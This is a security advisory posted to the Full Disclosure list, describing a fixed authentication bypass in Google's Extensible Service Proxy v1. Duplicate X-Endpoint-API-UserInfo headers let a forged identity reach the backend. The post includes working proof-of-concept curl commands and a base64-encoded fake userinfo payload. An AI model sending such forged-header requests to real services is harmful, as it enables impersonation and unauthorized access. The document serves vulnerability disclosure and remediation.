@@ -1,0 +1,125 @@
+
+Date: Fri, 24 Sep 2021 23:00:11 +0200
+From: Imre Rad <radimre83@...il.com>
+To: fulldisclosure@...lists.org
+Subject: [FD] Google Extensible Service Proxy v1 - CWE-287 Improper
+	Authentication
+
+Extensible Service Proxy (a.k.a. ESP) is an open source software by
+Google assisting Cloud Endpoints, a product on Google Cloud Platform.
+ESPv1 is an nginx based proxy which enables API management
+capabilities for JSON/REST or gRPC API services.
+
+In a typical deployment, ESP is running and fronting the backend
+service on the same host (the backend listening in a private network
+namespace which is accessible to the public only through ESP). In
+other words: ESP is running in the security boundaries of the customer
+(from Google's point of view).
+Among other features, it supports various authentication mechanisms
+and provides a consolidated interface for the backend.
+ESP injects a special HTTP header (X-Endpoint-API-UserInfo) about the
+authenticated remote entity while proxying the request to the backend.
+The documentation of this feature can be found here:
+
+https://cloud.google.com/endpoints/docs/openapi/authenticating-users-custom#receiving_authenticated_results_in_your_api
+
+To prevent forgery, ESP removes this header from the incoming
+requests. However, the implementation did not do this properly and
+"removed" only the first occurrence of this header from the incoming
+requests. Consider the following example (which is sent to an API
+method that does not require any kind of authentication):
+
+curl -H "X-Endpoint-API-UserInfo: whatever" -H
+"X-Endpoint-API-UserInfo: this-header-bypasses-the-protection" ...
+
+The backend service received the HTTP request with the following
+headers (yes, the first one is an empty one):
+
+X-Endpoint-API-UserInfo:
+X-Endpoint-API-UserInfo: this-header-bypasses-the-protection
+
+API methods that do require authentication are also affected. In this
+case ESP includes a valid X-Endpoint-API-UserInfo header as a first
+one, but it passes through the malicious secondary
+X-Endpoint-API-UserInfo header as well. The backend received a request
+like this:
+
+X-Endpoint-API-UserInfo: legitimate-header-constructed-by-ESPv1
+X-Endpoint-API-UserInfo: this-header-bypasses-the-protection
+
+What is the impact of this? It depends on how the backend application
+processes the incoming requests, more precisely, which version of the
+UserInfo header would the application business logic actually see and
+work with. So this depends on the language/framework in use. Some
+implementations return:
+- only the first piece (e.g. Golang's Header.Get())
+- all of them in an array (e.g. Golang's Header["..."])
+- the last occurrence (e.g. Symfony in PHP)
+- each header joined into a comma separated string (e.g Python or Ruby).
+
+The PHP version has high impact, so I demonstrated this to Google via
+the following steps:
+
+Setup Cloud Endpoints along with ESPv1 by following the PHP steps
+official tutorial:
+https://cloud.google.com/endpoints/docs/openapi/get-started-compute-engine-docker#php
+
+Obtain a valid ID token:
+valid_idtoken="$(gcloud auth print-identity-token
+--audiences="YOUR-CLIENT-ID" )"
+
+Verify it worked (this is invoking an API method that requires a
+Google signed identity token and echoes back the info received via the
+X-Endpoint-API-UserInfo header):
+curl     --header "content-type:application/json"
+"http://35.209.207.62:80/auth/info/googleidtoken"  -v -H
+"Authorization: Bearer $valid_idtoken"
+
+So you should see something like this:
+{"claims":"{\u0022iss\u0022:\u0022https:\/\/accounts.google.com ...
+
+Now construct a userinfo json with your desired content:
+
+fake_userinfo="$(echo '{
+  "id": "from-sub",
+  "issuer": "from-iss",
+  "email": "from-email",
+  "audiences": ["from-aud"],
+  "claims": "whatever"
+}' | base64 -w0)"
+
+And send the crafted request:
+
+curl     --header "content-type:application/json"
+"http://35.209.207.62:80/auth/info/googleidtoken"  -v -H
+"Authorization: Bearer $valid_idtoken"  -H "X-Endpoint-API-UserInfo:
+doesntmatter" -H "X-Endpoint-API-UserInfo: $fake_userinfo"
+
+The output will be:
+
+{"id":"from-sub","issuer":"from-iss","email":"from-email","audiences":["from-aud"],"claims":"whatever"}
+
+Fix and remediation:
+
+Google has fixed this flaw with this commit:
+https://github.com/cloudendpoints/esp/commit/e310c4f91d229a072507f80c73811489b4cdff27
+
+Administrators of ESPv1 fronted services where the backend is
+vulnerable should upgrade to a recent version of ESP with the above
+fix included. Alternatively, migrate to ESPv2 which is not affected by
+this flaw at all.
+(https://cloud.google.com/endpoints/docs/openapi/migrate-to-esp-v2)
+
+Timeline:
+Aug 9, 2021 - flaw discovered, report submitted
+Aug 9, 2021 - triaged, "looking into it"
+Aug 12, 2021 - some technical follow up questions back and forth
+Aug 12, 2021 - Submission accepted ("Nice catch!"), ticket filed to
+the product team
+Sep 18, 2021 - "all the bugs we created based on your report have been
+fixed by the product team"
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
